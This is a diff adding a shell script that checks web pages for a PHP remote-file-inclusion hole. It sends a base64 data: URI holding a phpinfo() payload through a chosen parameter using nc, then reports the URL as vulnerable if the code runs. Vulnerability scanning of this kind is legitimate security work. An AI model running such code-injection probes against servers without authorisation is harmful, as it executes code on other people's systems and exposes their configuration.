@@ -1,0 +1,44 @@
+#!/bin/sh
+
+# PHP data stream remote include checker
+
+function usage
+{
+  echo "Usage: $0 <url> <arg> [other args]"
+  exit
+}
+
+if [ $# -lt 2 ]; then
+  usage
+fi
+
+PATTERN='data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
+
+URL=$1
+PARAM=$2
+OTHER=$3
+
+STRLEN=`expr "$OTHER" : '.*'`
+if [ $STRLEN -gt 0 ]
+then
+  OTHER="&$OTHER"
+fi
+
+TEMP=`echo $URL | awk 'BEGIN { FS="/" } { print $3 }'`
+HOST=`echo $TEMP | awk 'BEGIN { FS=":" } { print $1 }'`
+PORT=`echo $TEMP | awk 'BEGIN { FS=":" } { print $2 }'`
+REQ=`echo $URL | awk 'BEGIN { FS="/" } { for (i=4; i<NF; i++) printf("%s/",$i) }'`
+FILENAME=`echo $URL | awk 'BEGIN { FS="/" } { print $NF }'`
+EXT=`echo $FILENAME | awk 'BEGIN { FS="." } { print $NF }'`
+
+if [ -z $PORT ]
+then
+  PORT=80
+fi
+  
+RESULT=`echo -e "GET /$REQ$FILENAME?$PARAM=$PATTERN$OTHER HTTP/1.0\n\n" | nc $HOST $PORT | grep "SERVER_SOFTWARE"`
+STRLEN=`expr "$RESULT" : '.*'`
+if [ $STRLEN -gt 0 ]
+then
+  echo "http://$HOST:$PORT/$REQ$FILENAME?$PARAM=$PATTERN$OTHER is vulnerable"
+fi
